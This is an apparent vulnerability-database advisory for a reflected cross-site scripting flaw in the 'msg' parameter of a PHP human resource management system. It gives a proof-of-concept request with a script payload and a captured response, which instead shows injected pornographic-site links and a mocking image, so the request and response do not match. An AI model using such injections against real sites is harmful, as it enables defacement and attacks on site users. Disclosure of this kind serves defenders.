---
title: HRM-1.0 2025 Cross-site scripting (reflected)
url: https://cxsecurity.com/issue/WLB-2025060006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-09
fetch_date: 2025-10-06T22:50:10.353554
---

# HRM-1.0 2025 Cross-site scripting (reflected)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **HRM-1.0 2025 Cross-site scripting (reflected)** **2025.06.08**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: HRM-1.0 2025 Cross-site scripting (reflected)
## Author: nu11secur1ty
## Date: 06/06/2025
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/15740/human-resource-management-system-project-php-and-mysql-free-source-code.html
## Reference: https://portswigger.net/web-security/cross-site-scripting
## Description:
The value of the 'msg' request parameter is copied into the HTML document as plain text between tags. The payload qq1r0<script>alert(1)</script>uideq was submitted in the msg parameter. This input was echoed unmodified in the application's response.
STATUS: HIGH- Vulnerability
[+]PoC:
```
GET /hrm/index.php?msg=Username%20and%20Password%20is%20Wrong!qq1r0%3cscript%3ealert(1)%3c%2fscript%3euideq HTTP/1.1
Host: pwnedhost.com
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Referer: http://c002fdb5-0dfa-412d-85a2-9acbad562940.com/
Sec-CH-UA: "Chromium";v="136", "Not;A=Brand";v="24", "Google Chrome";v="136"
Sec-CH-UA-Platform: "Windows"
Sec-CH-UA-Mobile: ?0
```
[+]Response:
```
HTTP/1.1 200 OK
Date: Fri, 06 Jun 2025 09:36:28 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4
X-Powered-By: PHP/8.2.4
Content-Length: 4044
Connection: close
Content-Type: text/html; charset=UTF-8
<!DOCTYPE HTML>
<html>
<head>
<title>Login Page - HRM</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Pooled Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template,
Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- Bootstrap Core CSS -->
<link href="css/bootstrap.min.css" rel='stylesheet' type='text/css' />
<!-- Custom CSS -->
<link href="css/style.css" rel='stylesheet' type='text/css' />
<link rel="stylesheet" href="css/morris.css" type="text/css"/>
<!-- Graph CSS -->
<link href="css/font-awesome.css" rel="stylesheet">
<link rel="stylesheet" href="css/jquery-ui.css">
<!-- jQuery -->
<script src="js/jquery-2.1.4.min.js"></script>
<!-- //jQuery -->
<link href='//fonts.googleapis.com/css?family=Roboto:700,500,300,100italic,100,400' rel='stylesheet' type='text/css'/>
<link href='//fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
<!-- lined-icons -->
<link rel="stylesheet" href="css/icon-font.min.css" type='text/css' />
<!-- //lined-icons -->
<style>
html{
min-height: calc(100%);
width:calc(100%);
}
body, .main-wthree{
width:calc(100%);
min-height: 100vh;
}
.main-wthree{
padding-bottom:2em;
display:flex;
flex-direction: column;
align-items:center;
justify-content:center;
}
.footer{
width:100%;
position:fixed;
bottom:0;
left:0
}
.sin-w3-agile{
padding:0;
}
.login{
background-color: #010101;
background-image: linear-gradient(160deg, #010101 0%, #4e6865 100%);
}
.login-w3 {
width: 100%;
float: unset;
text-align: center;
}
.main-wthree input[type="submit"]:hover {
background: #3e5250;
}
</style>
</head>
<body>
<div class="main-wthree">
<div class="container">
<h1 class="text-center text-white">Human Resource Management System</h1>
<div class="sin-w3-agile">
<h2>Login In</h2>
<form action="controller/login.php" method="post">
<div class="email">
<span class="email">Email:</span>
<input type="Email" name="name" class="name" placeholder="Enter Email Address">
<div class="clearfix"></div>
</div>
<div class="password-agileits">
<span class="username">Password: <i class="fa fa-eye-slash" aria-hidden="false" style="padding-left: 20px;" onclick="passwordeyes(this);"></i></span>
<input type="password" name="password" id="Psw" class="password" placeholder="Enter Password">
<div class="clearfix"></div>
</div>
<h4 style="color: #F1C40F;">Username and Password is Wrong!<a href="https://www.pornhub.com" target="\_blank">
<img src="https://media1.tenor.com/m/sLjUbG5BVikAAAAd/trump-dance-trump-2024.gif" alt="STUPID"width="900" height="450">
</a></h4>
<div class="login-w3">
<input type="submit" name="submit" class="login" value="Sign In">
</div>
<div class="clearfix"></div>
<h5 class="text-center"><a href="./user" class="text-white" >Login as an Employee</a></h5>
<div class="clearfix"></div>
</form>
<!-- <div class="back">
<a href="index.php">Back to home</a>
</div> -->
<div class="footer">
<p>Human Resource Managemant System. All Rights Reserved &copy; 2025 </p>
</div>
</div>
</div>
</div>
<script>
function passwordeyes(\_this) {
var x = document.getElementById("Psw").type;
if(x=="password"){
document.getElementById("Psw").type="text";
\_this.setAttribute('class', "fa fa-eye")
}else{
document.getElementById("Psw").type="password";
\_this.setAttribute('class', "fa fa-eye-slash")
}
}
</script>
</body>
</html>
```
[+]Exploit:
```
[href](https://satoshidisk.com/pay/COZeJl)
```
## Reproduce:
[href](https://www.youtube.com/watch?v=hzDslf652tI)
## Time spent:
00:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11se...